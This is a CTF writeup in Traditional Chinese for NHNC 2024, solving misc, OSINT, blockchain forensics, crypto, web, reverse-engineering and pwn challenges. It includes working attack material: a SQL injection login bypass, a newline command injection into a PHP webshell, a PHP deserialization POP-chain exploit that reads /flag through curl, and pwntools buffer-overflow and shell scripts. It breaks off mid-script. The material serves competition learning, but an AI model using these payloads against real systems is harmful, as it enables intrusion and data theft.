---
title: NHNC 2024 writeup
published: 2024-11-19
description: "Writeup for NHNC 2024"
tags: ["Cybersec","writeup"]
category: CTF
draft: false
lang: zh_TW
---

![image](https://hackmd.io/_uploads/rkGxWW_MJg.png)


# Misc
## "A Gift from the Leader Organizer" (1 pt)
![image](https://hackmd.io/_uploads/rJGfy8FzJl.png)
總召大人最帥了😘

> NHNC{fishbaby1011sohandsome}

## Blog 2 (20 pts)
```
出題者: Elliot_404

承上題（Blog 1），這個 Blog 的主人好像洩漏了他不想別讓人知道的東西，請試著找出來
```
[Blog link](https://neko-2077.github.io/)
在[推薦Vtuber](https://neko-2077.github.io/p/%E6%8E%A8%E8%96%A6-vtuber/)文章下的留言區，有neko-2077的留言
![image](https://hackmd.io/_uploads/BJ6R-ZdMkx.png)
在他的[Disqus留言](https://disqus.com/by/neko2077/?l=zh_TW)，有個`不要點進來`
![image](https://hackmd.io/_uploads/ByiEzW_Mye.png)

點進去就可以看到Blog 2了
![image](https://hackmd.io/_uploads/BJvwfZ_zkx.png)

> NHNC{comments_disqusjs}

## Blog 3 (50 pts)
```
出題者: Elliot_404

承上題（Blog 1），這個 Blog 的主人好像洩漏了他不想讓別人知道的東西，請試著找出來
```
[Blog link](https://neko-2077.github.io/)


一樣在[推薦Vtuber](https://neko-2077.github.io/p/%E6%8E%A8%E8%96%A6-vtuber/)頁面裡，對香香的封面圖右鍵>Open image in new tab

![Screenshot 2024-11-18 080214](https://hackmd.io/_uploads/Bkn84W_z1x.png)

可以觀察到網址的`φ0`有點不正常
![image](https://hackmd.io/_uploads/SkYi4W_G1e.png)

把後面的照片連結去掉，即可進入Blog 3
![Screenshot 2024-11-18 080559](https://hackmd.io/_uploads/r1ZBSWuf1x.png)

> NHNC{image_url}

## Where is this (20 pts)
```
出題者: Elliot_404

 這在哪裡？

Flag 格式：NHNC{緯度_經度}
（無條件捨去取到小數後三位）

ex:NHNC{12.345_114.514}
```
附圖連結:https://nhnc.ic3dt3a.org/files/316ada6f8668dc977279ead9ed301fef/OSINT.jpg

線索是點店名:`曾家乾麵`、`河堤上的貓`、`竹東排骨酥麵`
![image](https://hackmd.io/_uploads/SyrcUZOGJe.png)

接著在google map上搜尋即可<br>
註:不建議用`曾家乾麵`搜尋<br>

我用`河堤上的貓`在google map上搜尋，只找到一個地方，也符合圖片裡`⊥`的道路結構
![image](https://hackmd.io/_uploads/H1cEvZdGkl.png)

右鍵即可看到經緯度資訊
![image](https://hackmd.io/_uploads/H1MzO-_fyx.png)

> NHNC{24.802_120.979}

## NHNC, but C0LoRfUl (39 pts)
```
出題者:chilin.h

https://discord.gg/BhrD6sPtNs

Everyone is welcome here!
I felt that the original server was too old-fashioned, so I added a new coloring function!
Whether you are an administrator, a worker, or a participant, you can color your fonts!

歡迎大家來這邊！
我覺得原本的伺服器太古板了，所以新增了上色功能！
無論你是管理員、工人、還是參與者，都可以為你的字體上色！
```

進入Discord Server，發現我們有管理身分組的權限，直接開好開滿
![image](https://hackmd.io/_uploads/SyKV5buzkx.png)

就可以看到多出現了`flag` channel
![image](https://hackmd.io/_uploads/H10cwadfye.png)


解碼base64即可

> NHNC{oI\*Y1oxk^@vbXLbxXSQ89N3vsW$zoS5\*QQp5riz^q$Zj9hMc55X\*w3sg6CP10bD6cTadaz2aHVjt0qK#nwdiUDt2#9Dj^\*Wo5a9$6LecFD&Ir*ewufJ4LEjk0XUCYTe0}   

# Forensics
## BotNet1 (60 pts)
```
出題者: whale.120

Some bad bots (uhh...maybe contracts) are trading on Sepolia Ethernaut test net, the first bot's address is 0xAD840c4c2F869896EfE0891614faA1908dcD0153, find it's pal's address and wrap it in NHNC{}!
```

進入[Sepolia-etherscan](https://sepolia.etherscan.io/)，輸入給定的地址<br>
在Internal Transection中，有一筆合約
![image](https://hackmd.io/_uploads/BkOwpZ_z1e.png)

> NHNC{0x3e9e0e9cee22Ccd0ac94604A72394B0A1CCdb27A}

## BotNet2 (80 pts)
```
出題者: whale.120

You have discovered the suspicious trade, now find the stacked data on it's pal!
```
進去看上一題解出來的的地址
![image](https://hackmd.io/_uploads/SkecEDGOfkx.png)

進去看這筆交易，選Show more，View input as選UTF-8
![image](https://hackmd.io/_uploads/SyhYvMdMyg.png)

> NHNC{boti_boti_im_in_ur_wifi}

# Crypto
## AES? (20 pts)
```
出題者: LemonTea

一段加密的訊息，需要破解加密才能解開。
```
[file link-output.txt](https://nhnc.ic3dt3a.org/files/994e70a682099984b99dfb31372f21e1/output.txt?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NDd9.ZzqZRQ.L9Qb3fXpKHBXxAfGWpjllJ4PbFs) 
output.txt:
```
Enter IV: 1234567890987654
Secret Key: 1234567890987654
output: TkdU8sqjliuakA+nj2aEmbDf+AaJwASfPuooaKadCqg=
```

隨便找個AES online decryption，選CBC mode
![image](https://hackmd.io/_uploads/BJBqcMOfke.png)

> NHNC{Y0u_kn0w_AES}

## Baby RSA (40 pts)
```
出題者: whale.120

RSA for babys
```
[file link-chal_17.py](https://nhnc.ic3dt3a.org/files/0af753d4faa8a004ce0b627fecca875e/chal_17.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Njl9.Zzqanw.RSAvFnKI5xa5MVKYZGVs-a3lsPA)

[//]: # (chal_17.py:)
```py file=chal_17.py
from Crypto.Util.number import *
from Secret import flag1
primes=[getPrime(512) for _ in range(3)]
p, q, r=primes[0], primes[1], primes[2]
n=p*q*r
e=0x10001
leak=p*q+q*r+r*p-p-q-r
c=pow(bytes_to_long(flag1), e, n)
print(f"{n=}\n{e=}\n{c=}\n{leak=}")

# output
'''
n=1588313940811583670388901008799979643227508347921726508187845925121888018384295030557217724452854073354506733734948963728906121944748626336175026165501032867164031437646285616387352213662865798266568754187475074439344239971434650851017361305440785085800565077621928128381888304170806890898358358161543138717722884498671012157552627202558915649163030193095159221015850832580026640394276672929163085422040567666556330271222397965912435822921196421000606733571473897
e=65537
c=1486820855515154236162411677801199668086445706624424596450332681618232039310031299864777925283743527869824964609902697207891204276017844138716399611186082902687240749084575448807382032315300097699346046330339044585017938639264266759415446628256358731949386881533600592561504081326543143711535184034996293644573109963922652147003096600799028140241574358077390864861527823922494294399292630017130705549749378273155565300089441218224857894833601009764541100666507221
leak=409806027984142046827568136516718279278250684987305418639665531440726724145235686048985209175210488783213754343387799291126405560172391062085673659617777577945402272340754442512900552853645251776025848281268240863874332635558325107405944737687367206917286149877313697949861173539315761823960563606616395256712
'''
```

整理一下已知資訊:

$n = p \cdot q \cdot r$<br>
$leak = pq + qr + rp - p - q - r$<br>

這樣，我們就可以開始計算$\varphi (n)$:

$\varphi (n) = (p - 1)  (q - 1)  (r - 1)$

展開:

$\varphi (n) = pqr - pq - pr - qr + p + q + r - 1$

`n`和`leak`帶入$\varphi (n)$可得:

$\varphi (n)=n - \text{leak} - 1$

exploit:
```python=
from Crypto.Util.number import *

n = 1588313940811583670388901008799979643227508347921726508187845925121888018384295030557217724452854073354506733734948963728906121944748626336175026165501032867164031437646285616387352213662865798266568754187475074439344239971434650851017361305440785085800565077621928128381888304170806890898358358161543138717722884498671012157552627202558915649163030193095159221015850832580026640394276672929163085422040567666556330271222397965912435822921196421000606733571473897
e = 65537
c = 1486820855515154236162411677801199668086445706624424596450332681618232039310031299864777925283743527869824964609902697207891204276017844138716399611186082902687240749084575448807382032315300097699346046330339044585017938639264266759415446628256358731949386881533600592561504081326543143711535184034996293644573109963922652147003096600799028140241574358077390864861527823922494294399292630017130705549749378273155565300089441218224857894833601009764541100666507221
leak = 409806027984142046827568136516718279278250684987305418639665531440726724145235686048985209175210488783213754343387799291126405560172391062085673659617777577945402272340754442512900552853645251776025848281268240863874332635558325107405944737687367206917286149877313697949861173539315761823960563606616395256712

phi_n = n - leak - 1
d = inverse(e, phi_n)
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag)
```

> NHNC{baby_math_won}

## Secret ROT13 (40 pts)
```
出題者: LemonTea

一段加密的訊息，需要破解加密才能解開。
```
[file link-output.txt](https://nhnc.ic3dt3a.org/files/53b33dc077dcfca2362347ca70191fc4/output.txt?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NTR9.Zzv0BA.b6r2Zoik-Eu9vLCdTZ4ee4ea7u0)
[file link-source.py](https://nhnc.ic3dt3a.org/files/211c55dcd9826daa8c3bd7962d719825/source.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NTV9.Zzv0BA.3jnZWJkABECM6BBvokhnIRaSD3A)
source.py:
```python=
def encrypt(text, key):
    encrypted_text = ""
    for i, char in enumerate(text):
        offset = ((i + 1 + key) * (i + 1)) % 26 
        if 'A' <= char <= 'Z':
            new_char = chr((ord(char) - ord('A') + offset) % 26 + ord('A'))
        elif 'a' <= char <= 'z':
            new_char = chr((ord(char) - ord('a') + offset) % 26 + ord('a'))
        else:
            new_char = char 
        encrypted_text += new_char
    return encrypted_text

# 測試範例
key = 7
plaintext = "NHNC{TEST}"
ciphertext = encrypt(plaintext, key)
print("加密後的密文:", ciphertext)
```
output.txt:
```
VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}
```

每個字元的加密是基於其位置 `i` 和給定的密鑰 `key`
$\text{offset} = ((i + 1 + \text{key}) \times (i + 1)) \% 26$

反向操作，把`offset`減掉，然後還原到對應的ASCII範圍

最後暴力找`key`

exploit:
```python=
def decrypt(encrypted_text, key):
    decrypted_text = ""
    for i, char in enumerate(encrypted_text):
        offset = ((i + 1 + key) * (i + 1)) % 26 
        if 'A' <= char <= 'Z':
            new_char = chr((ord(char) - ord('A') - offset) % 26 + ord('A'))
        elif 'a' <= char <= 'z':
            new_char = chr((ord(char) - ord('a') - offset) % 26 + ord('a'))
        else:
            new_char = char 
        decrypted_text += new_char
    return decrypted_text

for i in range(1, 26):
    print(decrypt("VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}", i))
```
```bash
└─$ python3 epx_rot13.py | grep NHNC
NHNC{Y0u_kn0w_H0w_to_decrypte}
```

> NHNC{Y0u_kn0w_H0w_to_decrypte}

## Ande Yo Caliente (60 pts)
```
出題者: whale.120

Chacha~
```
[file link](https://nhnc.ic3dt3a.org/files/01b1412b45bb251fa9bc243216689584/chal.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NDh9.ZzwKzQ.BPKmyaHbm67_hF9JY3I0PYgeZ0s)

chal.py:
```python=
from Crypto.Cipher import ChaCha20
from secret import FLAG
import os
def encrypt(message, key, nonce):
    cipher = ChaCha20.new(key=key, nonce=iv)
    ciphertext = cipher.encrypt(message)
    return ciphertext
message = b'When you feel my heat, look into my eyes\nIt\'s where my demons hide'
key, iv = os.urandom(32), os.urandom(12)
encrypted_message = encrypt(message, key, iv)
encrypted_flag = encrypt(FLAG, key, iv)
data = iv.hex() + '\n' + encrypted_message.hex() + '\n' + encrypted_flag.hex()
f=open("out.txt", "w")
f.write(data)
'''
out.txt:
635b52504ab86d67d780dede
eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02dde7df7ca34288a0fa21bd8889c57d3ff986a9566f09733cfbc6e
f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66
'''
```
這題給了一個明文的message/加密過的message，還有加密過的flag，以及加密兩者的`IV`(ChaCha20的`nonce`)

但ChaCha20的加密法是生成一個keystream再XOR

$\text{ciphertext} = \text{keystream} \oplus \text{text}$

所以其實不用`IV`也沒差?

所以就利用XOR的特性，用給定的明/密文得到keystream

再用keystream解flag

exploit:
```python=
from Crypto.Cipher import *
from binascii import *

#iv = unhexlify("635b52504ab86d67d780dede")
encrypted_message = unhexlify("eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02dde7df7ca34288a0fa21bd8889c57d3ff986a9566f09733cfbc6e")
encrypted_flag = unhexlify("f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66")

message = b"When you feel my heat, look into my eyes\nIt's where my demons hide"

stream = bytes([m ^ c for m, c in zip(message, encrypted_message)])
flag = bytes([c ^ s for c, s in zip(encrypted_flag, stream)])

print(flag.decode())
```

>NHNC{what_i_learned_from_htb}

## Duplicated (255 pts)
```
I don't know what to say, just a tricky but kinda easy one.

Do you catch your breath when I look at you?
Are you holding back, like the way I do?
URL: http://23.146.248.134:31337/check
```
[file link](https://nhnc.ic3dt3a.org/files/343e5057666aa35348b147f9be75b112/source.py?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Njh9.ZzwpMQ.zs5OMSmM2FgD1yAM8nPIhifiAFI)

source.py:

```python=
from flask import Flask, request, jsonify
import base64
import hashlib

app = Flask(__name__)

def base64_decode(data):
    try:
        return base64.b64decode(data)
    except Exception:
        return None

def validate_pair(data1, data2):
    decoded1 = base64_decode(data1)
    decoded2 = base64_decode(data2)
    
    if decoded1 is None or decoded2 is None:
        return False
    if b"whale_meowing" not in decoded1 or b"whale_meowing" not in decoded2:
        return False

    md5_1 = hashlib.md5(decoded1).hexdigest()
    md5_2 = hashlib.md5(decoded2).hexdigest()
    return md5_1 == md5_2

@app.route('/check', methods=['POST'])
def check():
    try:
        data = request.get_json()

        if not isinstance(data, list) or not all(isinstance(pair, list) and len(pair) == 2 for pair in data):
            return jsonify({"status": "wrong", "error": "Invalid input format"}), 400

        if len(data) != 100:
            return jsonify({"status": "wrong", "error": "Exactly 100 pairs required"}), 400

        all_inputs = [item for pair in data for item in pair]
        if len(all_inputs) != len(set(all_inputs)):
            return jsonify({"status": "wrong", "error": "Duplicate inputs found"}), 400
        
        for pair in data:
            if not validate_pair(pair[0], pair[1]):
                return jsonify({"status": "wrong"}), 200
        
        return jsonify({"status": "NHNC{FAKE_FLAG}"}), 200

    except Exception as e:
        return jsonify({"status": "wrong", "error": str(e)}), 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=31337)
```

他會接收一個長度為100的`data`

然後`data`裡面包含一個list，裡面放兩個Base64編碼過的字串

最後做驗證:
- 沒有重複的Base64字串
- Base64解碼後必須包含`whale_meowing`
- List內兩個字串MD5雜湊過必須要一樣

~~然後透過ChatGPT~~，發現Base64有個特性:解碼時會忽略空格、`!`、`-`等不支援的字元

稍微實驗一下:
```python
>>> base64.b64decode("YWJj".encode())
b'abc'
>>> base64.b64decode("Y W J j".encode())
b'abc'
>>> base64.b64decode("Y W!Jj".encode())
b'abc'
>>> base64.b64decode("Y!W\nJ\rj".encode())
b'abc'
>>> base64.b64decode("Y!W\nJ~ j_.-".encode())
b'abc'
```
真的ㄟ，好扯ㄛ

這樣就可以寫exploitㄌ:
```python=
import requests
import base64

url = "http://23.146.248.134:31337/check"

def generate_variants(encoded_str, existing_set):
    variants = set()
    for i in range(2):
        new_str = ''
        for c in encoded_str:
            new_str += c 
        if(i==1):
            new_str += ' '
        new_str += ' '
        variants.add(new_str)
        existing_set.add(new_str)
    return list(variants)

data = []
all_inputs_set = set()

for i in range(100):
    content = f"whale_meowing_{i}".encode()
    base_encoded = base64.b64encode(content).decode()
    variants = generate_variants(base_encoded,all_inputs_set)
    data.append(variants)

response = requests.post(url, json=data)
print(response.json())
```

> NHNC{is_md_an_abbreviation_for_maid?}

# Web
## 哥布林保衞部公告 (30 pts)
```
出題者: 哥布林長老-Frank

為保護我哥布林族同胞，本保衛部特出此公告以保護我們免於精靈族的誘惑！
HINT:用Burp suite抓看看嗎 要這麼麻煩嗎
```
Link:https://nhnc-ctf-frank.dypc.cc/

直接View page source
![image](https://hackmd.io/_uploads/BJSauGuMJl.png)

> NHNC{BeCareful!}


## EASY METHOD (100 pts)
```
I "PUT" something in the website, could u find the "METHOD" to get it?

http://23.146.248.227:60001/
```
用browser打開
![image](https://hackmd.io/_uploads/HJvOTcdf1x.png)

推測應該要用不同的method，結合提敘，推測用`PUT`

用curl抓下來
```bash
└─$ curl -X PUT http://23.146.248.227:60001/
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTTP Method Challenge</title>
</head>
<body>
    <h1>這是我的網站</h1>
    <p>來找找看我存在這裡的酷酷資料</p>

    <p><strong>FLAG: NHNC{Y0u_kn0w_H0w_t0_us3_CURL}</strong></p></body>
</html>
```

> NHNC{Y0u_kn0w_H0w_t0_us3_CURL}

## I need to get the C00kies (100 pts)
```
出題者: LemonTea

I am making a web that can show something but I can't become an admin and get the cookies can you help me?
http://chal.nhnc.ic3dt3a.org:60002/
```

連進去長這樣:
![image](https://hackmd.io/_uploads/HJBQu2OG1l.png)

在Application > Cookies，可以看到目前的role是user:
![image](https://hackmd.io/_uploads/Sy7Uu3OMJl.png)

右鍵Edit Value改admin，Reload Page
![image](https://hackmd.io/_uploads/S1l5d2OG1l.png)

> NHNC{You_Kn0w_H0w_t0_chang3_th3_c00ki3}

## Login (100 pts)
```
Just login and get the flag

http://chal.nhnc.ic3dt3a.org:60003/
```

就一個很簡單的Login Page，直覺SQL Injection
![image](https://hackmd.io/_uploads/S1fAchdf1x.png)

當時啥都沒想，隨便構造一個payload:
`admin' OR 1=1--`

...然後就打進去了XDDD
![image](https://hackmd.io/_uploads/SyV2i3OM1e.png)

> NHNC{S1mp|e_-_SQL!}

## 1 line php (300 pts)
```
1 line >w<b

http://chal.nhnc.ic3dt3a.org:60000
Hint:
Flag is at /
```
連進去:
![image](https://hackmd.io/_uploads/S1J7nhOz1l.png)
一個很簡單的php木馬，但發現前面插了一個註解符號，變成不會執行`system()`函數

我們可以用換行的方式規避掉

`cmd`參數用`%0Als%20/`(`%0A`是換行的URL編碼):
![image](https://hackmd.io/_uploads/HymagTuzJe.png)
flag的檔案是`flag-`

payload:
`http://chal.nhnc.ic3dt3a.org:60000/?cmd=%0A%20cat%20/flag-`

> NHNC{enter_is_always_the_best}

## Democracy (350 pts)
```
出題者: Frank

The Republic of Frank National Assembly needs your participation! Head over here

Hint:
FOSS-Its means Open for what?
```
Link:https://nhnc-ctf-frank2.dypc.cc/
![image](https://hackmd.io/_uploads/SkEcEauMkx.png)

按下`我要覆議`按鈕，會被rick roll

但看他的跳轉連結，是導向`/next`
![image](https://hackmd.io/_uploads/S1ver6dG1g.png)

用Burp Suite，攔封包看HTTP History
![image](https://hackmd.io/_uploads/HJdnrp_Mkx.png)

只專注在`/next`的response

裡面的內容很多很亂，但最後可以看到:
![image](https://hackmd.io/_uploads/S15UU6_G1g.png)

用Dev mode > Console就可以看到了(記得用burp suite卡著) 
![image](https://hackmd.io/_uploads/Hy1nI6ufJe.png)

>NHNC{That'sEasyRight?}

## POPcorn (460 pts)
```
Do you know what's a POP Chain?
flag is in /flag

http://chal.nhnc.ic3dt3a.org:60008/
```
點開出現一個輸入框，還有網頁原始碼

題目告訴我們是php反序列化漏洞

只關注php的部分:
```php=
<?php
class WHALE{
    public function __construct($name, $report_uri)
    {
        $this->name = $name;
        $this->report_uri = $report_uri;
    }

    public function __get($obj)
    {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $this->report_uri);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        echo $response;
    }

    public function __wakeup()
    {
        echo "NHNC{FAKE_FLAG}";
    }

}

class MEOW{
    public function __construct($cat_struct)
    {
        $this->id = $cat_struct;
        echo $this->id->name;
    }
    public function __toString()
    {
        return     $this->id->r3a1_name;
    }
    public function __sleep()
    {
        return "serialized >w<b, but I want to sleep :zzz:";
    }
}

class TEST{
    public function __construct($note, $url)
    {
        $this->note = $note;
        $this->url = $url;
    }
    public function __destruct()
    {
        if (preg_match('pwned', $this->url))
        {
            system('echo `date` >> log.txt');
        };
    }
}

if (isset($_POST['pop'])){
    unserialize(base64_decode($_POST['pop']));
}
?>
```
首先要理解php的[Magic Method](https://docs.phplang.net/manual/en/language.oop5.magic.php)
- `__wakeup()` \: object被deserialization時自動調用
- `__destruct()` \: object的lifecycle結束(被Destruction)自動調用
- `__get()` \: 訪問未定義時自動調用

然後我們會發現:

php腳本結束時，會自動調用`TEST::__destruct()`

裡面的`grep_match('pwned', $this->url)`第二個參數應該是`string`，但`$this->url`是一個object

這時候就會自動觸發`MEOW::__toString()`，裡面又訪問了`$this->id->r3a1_name`

但`r3al_name`沒被定義，這時候觸發`WHALE::__get()`(`__get(r3al_name)`)

然後get裡面執行了curl請求

payload目標:`__get()`請求內的`curl(r3al_name)`改為`curl(file:///flag)`


撰寫exploit:
```php=
<?php
class WHALE{
    public function __construct($name, $report_uri)
    {
        $this->name = $name;
        $this->report_uri = $report_uri;
    }
}

class MEOW{
    public function __construct($cat_struct)
    {
        $this->id = $cat_struct;
    }
}

class TEST{
    public function __construct($note, $url)
    {
        $this->note = $note;
        $this->url = $url;
    }
} 
$whale = new WHALE('abc', 'file:///flag');
$meow = new MEOW($whale);
$test = new TEST('test', $meow);

$serialized = serialize($test);
$payload = base64_encode($serialized);
echo $payload;
?>
```
傳送payload:
```bash
└─$ curl -X POST -d "pop=Tzo0OiJURVNUIjoyOntzOjQ6Im5vdGUiO3M6NDoidGVzdCI7czozOiJ1cmwiO086NDoiTUVPVyI6MTp7czoyOiJpZCI7Tzo1OiJXSEFMRSI6Mjp7czo0OiJuYW1lIjtzOjM6ImFiYyI7czoxMDoicmVwb3J0X3VyaSI7czoxMjoiZmlsZTovLy9mbGFnIjt9fX0=" http://chal.nhnc.ic3dt3a.org:60008/index.php
NHNC{FAKE_FLAG}NHNC{is_pop_chain_a_kind_of_injection_?_anyway_is_the_best_language_for_hackers}
```
>NHNC{is_pop_chain_a_kind_of_injection_?_anyway_is_the_best_language_for_hackers}

# Reverse
## easyyyyyyyyyy (50 pts)
```
author: kohiro

No more hint because it is so eazyyyyyyyyy
```
[file link](https://nhnc.ic3dt3a.org/files/05c9a039e51004dc963aac8468d448d6/NHNCbabyreverse?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Mjh9.ZzqsOg.BUtpJUjsa6UuOIG4bAbI6mOrGLw)

用radare2分析，afl看到:
```bash
0x00401550    1     27 dbg.flag()
```
VV進去:
![image](https://hackmd.io/_uploads/HyJq6mdGJe.png)

> NHNC{this_is_a_easy_one}

## Guess the num (200 pts)
```
出題者：raymond

只有幸運的人才會拿到 flag。不幸運的人啊～今天不是你拿分數的好日子！
```
[file link](https://nhnc.ic3dt3a.org/files/c8ca6ecc673f41a29cf097dd79c14256/guess_the_num?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTd9.Zzqt1w.dXtqu9YRYdFW-NEfPFpj7o7lfeU)

這邊用IDA打開

main函式裡:
```c=
  srand(0x1234u);
  printf("Lottery! Enter your number: ");
  __isoc99_scanf("%u", &v5);
  v3 = v5 % 0xFF;
  if ( v3 == rand() % 255 )
  {
    printf("You're blessed today! Here's your flag: %s\n", flag);
    puts("Caution ahead! You will be *DISQUALIFIED* if you share the flag; not everyone has the luck you do!");
  }
  else
  {
    puts("You shall not pass! Only those who have luck can get the flag!");
  }
```
`flag`是在全域變數，直接點開看是`NHNC{as_clear_as_plaintext}`

但提交是顯示錯誤，回去看看有那些函式

發現了`sub_1217()`，裡面有存取到`flag`讓我很在意:
```c=
_BYTE *sub_1217()
{
  __int64 v0; // rax
  _BYTE *result; // rax
  //flag = 'NHNC{as_clear_as_plaintext}'
  v0 = sub_11E9(&flag[0x10000]);
  *(_BYTE *)(v0 + 5) += 19;
  *(_DWORD *)(v0 + 6) -= 117440001;
  *(_WORD *)(v0 + 10) = 24420;
  *(_QWORD *)(v0 + 12) ^= 0x3E0304001D163016uLL;
  *(_DWORD *)(v0 + 20) = 1919906916;
  *(_BYTE *)(v0 + 24) = 125;
  result = (_BYTE *)(v0 + 25);
  *result = 0;
  return result;
}
```
`sub_11E9()`:
```c=
__int64 __fastcall sub_11E9(__int64 a1)
{
  if ( rand() == -70111375 )
    return a1;
  else
    return a1 - 0x10000;
}
```
仔細分析`sub_1217()`:
- `flag[0x10000]`其實就是`flag[0]`的地址往後偏移`0x10000`
- `rand()`會回傳的就只有正數，所以`sub_11E9()`只會回傳`a1 - 0x10000`
    →`v0` = `flag[0]`
剩下怕會計算錯誤，這邊直接把code轉換成一般的C語言執行:
```c=
#include <stdio.h>
#include <stdint.h>
int main() {
    char flag[27] = "NHNC{as_clear_as_plaintext}";
    //sub_1217()
    int64_t v0 = (int64_t)(&flag[0]);

    flag[5] += 19;

    uint32_t *ptr_dword = (uint32_t *)(v0 + 6);
    *ptr_dword -= 117440001;

    uint16_t *ptr_word = (uint16_t *)(v0 + 10);
    *ptr_word = 24420;

    uint64_t *ptr_qword = (uint64_t *)(v0 + 12);
    *ptr_qword ^= 0x3E0304001D163016uLL;

    uint32_t *ptr_dword_2 = (uint32_t *)(v0 + 20);
    *ptr_dword_2 = 1919906916;
    flag[24] = 125;
    flag[25] = '\0';
    printf(flag);
    return 0;
}
```

> NHNC{traced_down_to_dtor}


# PWN
## Grading system (100 pts)
```
出題者：Raymond

線上評分系統！幫你的學生登記分數的好工具！

nc chal.nhnc.ic3dt3a.org 2003
```
[file link](https://nhnc.ic3dt3a.org/files/999ec6d04ddd2748cfdb904ef3f02a92/grading_system.zip?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NjV9.ZzrleQ.92HCyBGfRKK_XRkA-wt0YOddt98)

稍微看一下source code，在switch choice時，有個選項可以開shell:
```c=
case 'S':
    if (is_admin) {
        spawn_shell();
        break;
    } else {
        puts("Contact admin if you a bug occurred");
        break;
    }  
```
原本在想要怎麼用buffer overflow蓋掉`is_admin`，但發現初始值是`1234`

我:???

所以exploit很簡單:
```python=
from pwn import *

r = remote("chal.nhnc.ic3dt3a.org",2003)

r.sendlineafter('Number of students: ',b'114514')
r.sendlineafter('Your choice:',b'S')
r.interactive()
r.close()
```

```bash
$ ls
chal
flag
run.sh
$ cat flag
NHNC{i_dont_think_you_are_a_teacher}
exit
```

> NHNC{i_dont_think_you_are_a_teacher}

## DOF (100 pts)
```
出題者：whale.120

I've heard that you just learned overflow, show me twice!

nc chal.nhnc.ic3dt3a.org 2000
```
[file link](https://nhnc.ic3dt3a.org/files/9aa61456b15198e0e8ff13cf67f95783/chal_23?token=eyJ1c2VyX2lkIjo2MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NjZ9.Zzvxbg.bIUHXCsDgtTUpCbFCxFrw3bHO-g)

丟IDA:
```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int128 v6; // [rsp+0h] [rbp-30h] BYREF
  char v7[14]; // [rsp+10h] [rbp-20h] BYREF
  __int16 v8; // [rsp+1Eh] [rbp-12h]
  unsigned __int64 v9; // [rsp+28h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v6 = 0LL;
  strcpy(v7, "cat_say_meow");
  v7[13] = 0;
  v8 = 0;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  printf("What's you name:");
  ((void (__fastcall *)(__int128 *))gets)(&v6);
  if ( strstr(v7, "cat_sleeping") )
    secret_d00r(v7, "cat_sleeping", v3, v4);
  puts(v7);
  return 0;
}
```
看到`gets()`和題敘就可以猜到是buffer overflow了

目前`main`裡的目標是進入`secret_d00r()`

所以要想辦法用BOF蓋掉`v7`

然後我比較喜歡看上面IDA給的註解:
```c=
v9 [rbp-8h]
v8 [rbp-12h]
v7 [rbp-20h]
```
蓋掉`v9`+`v8`(0x12)，後面接上`cat_sleeping`

接著就可以進入`secret_d00r`:
```c=
int secret_d00r()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  __int64 v2; // r8
  __int64 v3; // r9
  char v5; // [rsp+7h] [rbp-19h]
  FILE *stream; // [rsp+8h] [rbp-18h]
  void *v7; // [rsp+10h] [rbp-10h]
  void *dest; // [rsp+18h] [rbp-8h]

  stream = fopen("flag", "r");
  if ( !stream )
  {
    puts("System Error...:(");
    exit(1);
  }
  v7 = malloc(0x14uLL);
  dest = malloc(0x14uLL);
  if ( !v7 || !dest )
    exit(0);
  memcpy(dest, "whale_meowing", 0xDuLL);
  puts("Welcome to the secret d00r");
  puts("There's a HEAP of broken doors, can you tell it's name?");
  printf("Enter the name: ");
  gets(v7, "whale_meowing", v0, v1, v2, v3);
  if ( strstr((const char *)dest, "pwn3d!!!") )
  {
    while ( 1 )
    {
      v5 = fgetc(stream);
      if ( v5 == -1 )
        break;
      putchar(v5);
    }
  }
  else
  {
    puts(aIThinkYouHaven);
  }
  return fclose(stream);
}
```
可以看出當`dest`內含有"pwn3d!!!"字串，就可以看到flag了

值得注意的是，`v7`和`dest`在執行時有用`malloc()`動態分配空間

我因為怕計算錯誤，寫了個C code模擬看到空間計算offset:
```c=
#include <stdio.h>
#include <stdlib.h>

int main() {
    void *v7;
    void *dest;

    v7 = malloc(0x14uLL);
    dest = malloc(0x14uLL);

    printf("v7: %p\n", v7);
    printf("dest: %p\n", dest);

    free(v7);
    free(dest);

    return 0;
}
```
執行結果:
```
v7: 0xbb32a0
dest: 0xbb32c0
```
可以算出offset = 0xbb32c0 - 0xbb32a0 = 0x20

我們就可以撰寫exploit:
```python=
from pwn import *

#r = process('./chal_23')
r = remote("chal.nhnc.ic3dt3a.org",2000)

r.sendline(b'a'*0x12 + b'cat_sleeping')
r.recvuntil("Enter the name: ")
